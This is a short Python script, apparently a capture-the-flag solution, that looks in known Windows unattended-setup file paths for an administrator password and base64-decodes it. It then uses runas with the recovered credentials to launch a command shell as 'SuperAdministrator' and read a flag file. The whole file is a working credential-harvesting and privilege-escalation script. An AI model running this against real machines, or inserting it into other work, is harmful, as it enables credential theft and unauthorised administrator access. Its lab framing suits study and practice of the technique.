import os
import re
import base64
import subprocess

locations = [
    r"C:\Windows\sysprep\sysprep.inf",
    r"C:\Windows\system32\sysprep\autounattend.xml",
    r"C:\Windows\Panther\Unattend.xml",
    r"C:\Windows\system32\sysprep\Unattend.xml",
    r"C:\Unattend.xml",
    r"C:\autounattend.xml",
]

password = None
username = "SuperAdministrator"

for path in locations:
    if os.path.exists(path):
        print(f"[+] Found unattended file: {path}")
        with open(path, "r", errors="ignore") as f:
            content = f.read()

        match = re.search(r"<AdministratorPassword>\s*<Value>(.*?)</Value>", content, re.DOTALL)
        if match:
            encoded_password = match.group(1).strip()
            print(f"[+] Extracted encoded password: {encoded_password}")

            decoded = base64.b64decode(encoded_password + "==").decode("utf-8")
            print(f"[+] Decoded password: {decoded}")
            password = decoded
            break

if not password:
    print("[-] No password found!")
    exit(1)

print(f"\n[+] Launching admin CMD as {username}...")
command = f'runas /user:{username} "cmd /c type C:\\Users\\{username}\\Desktop\\flag.exe & pause"'
subprocess.run(command, shell=True)